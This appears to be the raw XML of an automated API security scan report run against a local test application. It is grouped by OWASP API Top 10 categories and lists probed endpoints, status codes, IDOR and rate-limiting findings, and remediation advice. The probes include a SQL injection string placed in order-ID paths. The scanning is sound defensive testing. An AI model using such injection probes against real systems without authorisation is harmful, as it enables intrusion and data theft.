        <w:t>113. **POST http://127.0.0.1:8888/community/api/v2/community/posts/99999/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/99999/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>114. **POST http://127.0.0.1:8888/community/api/v2/community/posts/550e8400-e29b-41d4-a716-446655440000/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/550e8400-e29b-41d4-a716-446655440000/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>115. **POST http://127.0.0.1:8888/community/api/v2/community/posts/admin/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/admin/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>116. **POST http://127.0.0.1:8888/community/api/v2/community/posts/1000000/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/1000000/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>117. **POST http://127.0.0.1:8888/community/api/v2/community/posts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/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/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/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>118. **POST http://127.0.0.1:8888/community/api/v2/community/posts/!@#$%^&amp;*()/comment**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/community/api/v2/community/posts/!@#$%^&amp;*()/comment`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 405</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars</w:t>
        <w:br/>
        <w:br/>
        <w:t>119. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/testuser`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:br/>
        <w:t>120. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/" OR "1"="1--",`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>121. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/550e8400-e29b-41d4-a716-446655440000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>122. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/admin`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>123. **PUT http://127.0.0.1:8888/workshop/api/shop/orders/-1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/-1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_negative</w:t>
        <w:br/>
        <w:br/>
        <w:t>124. **GET http://127.0.0.1:8888/workshop/api/shop/orders/testuser**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/testuser`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string</w:t>
        <w:br/>
        <w:br/>
        <w:t>125. **GET http://127.0.0.1:8888/workshop/api/shop/orders/" OR "1"="1--",**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/" OR "1"="1--",`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>126. **GET http://127.0.0.1:8888/workshop/api/shop/orders/550e8400-e29b-41d4-a716-446655440000**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/550e8400-e29b-41d4-a716-446655440000`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>127. **GET http://127.0.0.1:8888/workshop/api/shop/orders/admin**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/admin`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>128. **GET http://127.0.0.1:8888/workshop/api/shop/orders/-1**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/shop/orders/-1`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 404</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_negative</w:t>
        <w:br/>
        <w:br/>
        <w:t>129.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string</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': 'testuser'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>130.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injection</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '" OR "1"="1--",'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>131.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non_existent</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '99999'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>132.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random_uuid</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '550e8400-e29b-41d4-a716-446655440000'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>133.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admin_user</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': 'admin'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>134.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high_value</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '1000000'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>135.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integer_negative</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '-1'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>136.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integer_zero</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '0'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>137. **GET http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: integer_large</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Body:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'report_id': '2147483647'}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>138.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valid</w:t>
        <w:br/>
        <w:br/>
        <w:t>139.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other_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>140.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string</w:t>
        <w:br/>
        <w:br/>
        <w:t>141.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injection</w:t>
        <w:br/>
        <w:br/>
        <w:t>142.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non_existent</w:t>
        <w:br/>
        <w:br/>
        <w:t>143.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random_uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>144.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admin_user</w:t>
        <w:br/>
        <w:br/>
        <w:t>145.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high_value</w:t>
        <w:br/>
        <w:br/>
        <w:t>146.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string_long</w:t>
        <w:br/>
        <w:br/>
        <w:t>147. **POST http://127.0.0.1:8888/workshop/api/mechanic/signup**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/workshop/api/mechanic/signup`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.642702</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: string_special_chars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Implement object-level authorization checks on every request</w:t>
        <w:br/>
        <w:t>- Use unpredictable IDs (UUID) instead of sequential integers</w:t>
        <w:br/>
        <w:t>- Verify the requester has ownership/access rights for each object</w:t>
        <w:br/>
        <w:t>- Centralize authorization logic</w:t>
        <w:br/>
        <w:t>- Log and alert on failed authorization attempts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API2:2023 – Broken Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Incorrect authentication implementations make it possible to steal tokens or hijack sessions.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BrokenAuth (API02)</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 11:49:08</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888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0 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 4 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 0 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 0 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>🛑 **High Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/auth/login`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.692088</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate limiting on auth endpoints</w:t>
        <w:br/>
        <w:br/>
        <w:t>2. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/oauth/token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.720497</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate limiting on auth endpoints</w:t>
        <w:br/>
        <w:br/>
        <w:t>3. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/api/login`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.748880</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate limiting on auth endpoints</w:t>
        <w:br/>
        <w:br/>
        <w:t>4. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `http://127.0.0.1:8888/user/authenticate`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:08.777429</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: No rate limiting on auth endpoints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Use MFA for sensitive actions</w:t>
        <w:br/>
        <w:t>- Work with short-lived, cryptographically signed tokens</w:t>
        <w:br/>
        <w:t>- Secure password/token recovery flows</w:t>
        <w:br/>
        <w:t>- Temporarily lock accounts after too many failed attempts</w:t>
        <w:br/>
        <w:t>- Never expose credentials in URLs or error messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API3:2023 – Broken Object Property Level Authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Mass assignment and over-exposure: clients can see or modify fields that should remain hidden.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ObjectProperty (API03)</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 11:49:09</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888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0 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 1 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 0 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 0 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>🛑 **High Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `/workshop/api/shop/orders/{order_id}`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:09.484675</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Sensitive fields in response: order.user.email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Explicitly define which fields are visible/editable per role</w:t>
        <w:br/>
        <w:t>- Validate request and response payloads with schemas</w:t>
        <w:br/>
        <w:t>- Filter sensitive fields server-side before sending</w:t>
        <w:br/>
        <w:t>- Use different DTOs for different access levels</w:t>
        <w:br/>
        <w:t>- Strictly separate public and private properties</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API4:2023 – Unrestricted Resource Consumption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>No limits on payload size, pagination or requests can lead to DoS or higher costs due to resource exhaustion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "scanner": "ResourceConsumption (API04)",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "timestamp": "2025-06-01 11:49:25",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "base_url": "http://127.0.0.1:8888",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "findings": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/identity/api/auth/signup",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"2025-06-01T11:49:10.252462",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"2025-06-01T11:49:10.252462",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"2025-06-01T11:49:10.254992",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"2025-06-01T11:49:10.254992",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"/identity/api/auth/login",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"2025-06-01T11:49:10.828669",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"/identity/api/auth/login",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"2025-06-01T11:49:10.829219",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"/identity/api/auth/login",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"2025-06-01T11:49:10.829751",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"/identity/api/auth/login",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"2025-06-01T11:49:10.830815",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"/identity/api/auth/forget-password",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"2025-06-01T11:49:11.331818",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"/identity/api/auth/forget-password",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"2025-06-01T11:49:11.332177",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"/identity/api/auth/forget-password",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"2025-06-01T11:49:11.332914",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"/identity/api/auth/forget-password",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"2025-06-01T11:49:11.333971",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"/identity/api/v2/user/reset-password",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"2025-06-01T11:49:11.855953",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"/identity/api/v2/user/reset-password",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"2025-06-01T11:49:11.856377",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"/identity/api/v2/user/reset-password",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"2025-06-01T11:49:11.857466",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"/identity/api/v2/user/reset-password",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"2025-06-01T11:49:11.857993",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"/identity/api/v2/user/change-email",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"2025-06-01T11:49:12.324484",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"/identity/api/v2/user/change-email",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"2025-06-01T11:49:12.325010",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"/identity/api/v2/user/change-email",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"2025-06-01T11:49:12.325565",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"/identity/api/v2/user/change-email",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"2025-06-01T11:49:12.326631",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"/identity/api/v2/user/verify-email-token",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"2025-06-01T11:49:12.763031",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"/identity/api/v2/user/verify-email-token",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"2025-06-01T11:49:12.763554",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"/identity/api/v2/user/verify-email-token",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"2025-06-01T11:49:12.764081",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"/identity/api/v2/user/verify-email-token",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"2025-06-01T11:49:12.765141",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"/identity/api/v2/user/videos/{video_id}",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"2025-06-01T11:49:13.893677",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"/identity/api/v2/user/videos/{video_id}",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"2025-06-01T11:49:13.894210",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"/identity/api/v2/user/videos/{video_id}",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"2025-06-01T11:49:13.894858",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/identity/api/v2/user/videos/{video_id}",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"2025-06-01T11:49:13.895396",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/community/api/v2/community/posts/{postId}/comment",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"2025-06-01T11:49:16.621569",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/community/api/v2/community/posts/{postId}/comment",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"2025-06-01T11:49:16.622102",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/community/api/v2/community/posts/{postId}/comment",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"2025-06-01T11:49:16.622628",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/community/api/v2/community/posts/{postId}/comment",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"2025-06-01T11:49:16.623153",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"/workshop/api/shop/orders/{order_id}",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"2025-06-01T11:49:16.932521",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"/workshop/api/shop/orders/{order_id}",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"2025-06-01T11:49:16.933059",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"/workshop/api/shop/orders/{order_id}",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"2025-06-01T11:49:16.933596",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"/workshop/api/shop/orders/{order_id}",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"2025-06-01T11:49:16.934124",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"/workshop/api/shop/orders/return_order",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"2025-06-01T11:49:21.422766",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"/workshop/api/shop/orders/return_order",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"2025-06-01T11:49:21.423834",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"/workshop/api/shop/orders/return_order",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"2025-06-01T11:49:21.424368",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"/workshop/api/shop/orders/return_order",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"2025-06-01T11:49:21.425338",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"/workshop/api/mechanic/signup",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"2025-06-01T11:49:25.952469",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"/workshop/api/mechanic/signup",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"2025-06-01T11:49:25.952993",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"/workshop/api/mechanic/signup",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"2025-06-01T11:49:25.953525",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "endpoint": "/workshop/api/mechanic/signup",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "type": "System Error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "description": "Critical failure: HTTPAdapter.__init__() got an unexpected keyword argument 'backoff_factor'",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "severity": "High",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "timestamp": "2025-06-01T11:49:25.954053",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "data": null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Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Implement rate limiting and quotas</w:t>
        <w:br/>
        <w:t>- Set maximum payload sizes</w:t>
        <w:br/>
        <w:t>- Use pagination or partial responses</w:t>
        <w:br/>
        <w:t>- Monitor abnormal consumption</w:t>
        <w:br/>
        <w:t>- Cache expensive operations where possible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API5:2023 – Broken Function Level Authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Complex role/function matrices often lead to endpoints being accessible to regular users when they're only meant for admins.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Authorization</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 11:49:27</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888/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0 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 15 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 60 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 3 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>🛑 **High Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.684858</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unauthorized access - GET as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>2. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.724940</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unauthorized access - GET as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>3. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:26.753930</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unauthorized access - GET as anonymous</w:t>
        <w:br/>
        <w:br/>
        <w:t>4. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.055570</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>5. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.059282</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>6. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.062965</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>7. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.067204</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>8. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.070886</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>9. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.075133</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>10. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.079398</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>11. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.083637</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>12. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.088035</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>13. **Unnamed**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:27.092243</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: IDOR vulnerability detected</w:t>
        <w:br/>
        <w:br/>
        <w:t>14. **Unnamed**</w:t>
        <w:br/>
